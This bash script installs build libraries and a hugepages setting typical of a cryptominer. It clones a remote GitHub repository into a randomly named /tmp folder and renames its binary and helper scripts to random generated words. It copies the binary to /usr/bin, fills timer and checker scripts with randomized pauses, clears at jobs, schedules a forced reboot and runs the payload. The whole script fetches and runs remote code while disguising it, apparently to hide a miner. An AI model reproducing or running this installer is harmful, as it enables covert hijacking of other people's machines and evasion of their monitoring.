#!/bin/bash

sudo apt-get update -y;
sudo apt-get install at -y;

ID="$(hostname)"

THREADS="$(nproc --all)"

for i in `atq | awk '{print $1}'`;do atrm $i;done
echo 'sudo reboot -f' | at now + 12 hours


apt-get -y install gpw
apt-get -y install sudo


timer=$(gpw 1 11)
tmpfoldername=$(gpw 1 10)
softwarename=$(gpw 1 12)
checker=$(gpw 1 8)

time1=$(gpw 1 4)
time2=$(gpw 1 5)
time3=$(gpw 1 6)
time4=$(gpw 1 7)
time5=$(gpw 1 8)
time6=$(gpw 1 9)
##################################

pauseone=$(shuf -i 94-100 -n 1)
pausetwo=$(shuf -i 92-98 -n 1)
pausethree=$(shuf -i 76-82 -n 1)
pausefour=$(shuf -i 73-79 -n 1)
pausefive=$(shuf -i 79-85 -n 1)
pausesix=$(shuf -i 65-71 -n 1)

##################################
#rm -rf /tmp/
#mkdir /tmp
for i in `atq | awk '{print $1}'`;do atrm $i;done
sudo dpkg --configure -a
sudo echo 'vm.nr_hugepages=256' >> /etc/sysctl.conf
sudo sysctl -p
sudo apt-get update && sudo apt-get install git libcurl4-openssl-dev build-essential libjansson-dev libuv1-dev libmicrohttpd-dev libssl-dev autotools-dev automake screen htop nano cmake mc -y
sleep 2
cd /tmp && mkdir $tmpfoldername
sudo git clone https://github.com/tokdok/default.git /tmp/$tmpfoldername
cd /tmp/$tmpfoldername
sudo mv /tmp/$tmpfoldername/soft /tmp/$tmpfoldername/$softwarename
sudo chmod +x /tmp/$tmpfoldername/$softwarename
sudo chmod 777 /tmp/$tmpfoldername/*.sh
sudo cp /tmp/$tmpfoldername/$softwarename /usr/bin/

##########################################################

sudo sed -i "s/defaultsoftwarename/$softwarename/g" /tmp/$tmpfoldername/1.sh
sudo sed -i "s/defaultsoftwarename/$softwarename/g" /tmp/$tmpfoldername/2.sh
sudo sed -i "s/defaultsoftwarename/$softwarename/g" /tmp/$tmpfoldername/3.sh
sudo sed -i "s/defaultsoftwarename/$softwarename/g" /tmp/$tmpfoldername/4.sh
sudo sed -i "s/defaultsoftwarename/$softwarename/g" /tmp/$tmpfoldername/5.sh
sudo sed -i "s/defaultsoftwarename/$softwarename/g" /tmp/$tmpfoldername/6.sh

sudo mv /tmp/$tmpfoldername/1.sh /tmp/$tmpfoldername/$time1.sh
sudo mv /tmp/$tmpfoldername/2.sh /tmp/$tmpfoldername/$time2.sh
sudo mv /tmp/$tmpfoldername/3.sh /tmp/$tmpfoldername/$time3.sh
sudo mv /tmp/$tmpfoldername/4.sh /tmp/$tmpfoldername/$time4.sh
sudo mv /tmp/$tmpfoldername/5.sh /tmp/$tmpfoldername/$time5.sh
sudo mv /tmp/$tmpfoldername/6.sh /tmp/$tmpfoldername/$time6.sh
sleep 3


##########################################################

sudo sed -i "s/\<pauseone\>/$pauseone/g" /tmp/$tmpfoldername/defaulttimer.sh
sudo sed -i "s/\<pausetwo\>/$pausetwo/g" /tmp/$tmpfoldername/defaulttimer.sh
sudo sed -i "s/\<pausethree\>/$pausethree/g" /tmp/$tmpfoldername/defaulttimer.sh
sudo sed -i "s/\<pausefour\>/$pausefour/g" /tmp/$tmpfoldername/defaulttimer.sh
sudo sed -i "s/\<pausefive\>/$pausefive/g" /tmp/$tmpfoldername/defaulttimer.sh
sudo sed -i "s/\<pausesix\>/$pausesix/g" /tmp/$tmpfoldername/defaulttimer.sh

##########################################################

sudo sed -i "s/\<tmpfoldername\>/$tmpfoldername/g" /tmp/$tmpfoldername/defaulttimer.sh
sudo sed -i "s/\<1\>/$time1/g" /tmp/$tmpfoldername/defaulttimer.sh
sudo sed -i "s/\<2\>/$time2/g" /tmp/$tmpfoldername/defaulttimer.sh
sudo sed -i "s/\<3\>/$time3/g" /tmp/$tmpfoldername/defaulttimer.sh
sudo sed -i "s/\<4\>/$time4/g" /tmp/$tmpfoldername/defaulttimer.sh
sudo sed -i "s/\<5\>/$time5/g" /tmp/$tmpfoldername/defaulttimer.sh
sudo sed -i "s/\<6\>/$time6/g" /tmp/$tmpfoldername/defaulttimer.sh

sudo mv /tmp/$tmpfoldername/defaulttimer.sh /tmp/$tmpfoldername/$timer.sh


##########################################################

sudo sed -i "s/\<tmpfoldername\>/$tmpfoldername/g" /tmp/$tmpfoldername/defaultchecker.sh
sudo sed -i "s/\<defaulttimer.sh\>/$timer.sh/g" /tmp/$tmpfoldername/defaultchecker.sh

sudo mv /tmp/$tmpfoldername/defaultchecker.sh /tmp/$tmpfoldername/$checker.sh

##########################################################


sudo apt-get install dos2unix -y

sudo dos2unix /tmp/$tmpfoldername/$timer.sh
sudo dos2unix /tmp/$tmpfoldername/$time4.sh
sudo dos2unix /tmp/$tmpfoldername/$time2.sh
sudo dos2unix /tmp/$tmpfoldername/$time5.sh
sudo dos2unix /tmp/$tmpfoldername/$time3.sh
sudo dos2unix /tmp/$tmpfoldername/$time6.sh
sudo dos2unix /tmp/$tmpfoldername/$time1.sh

sudo rm /tmp/$tmpfoldername/start.sh
sudo bash /tmp/$tmpfoldername/$timer.sh && sudo bash /tmp/$tmpfoldername/$checker.sh


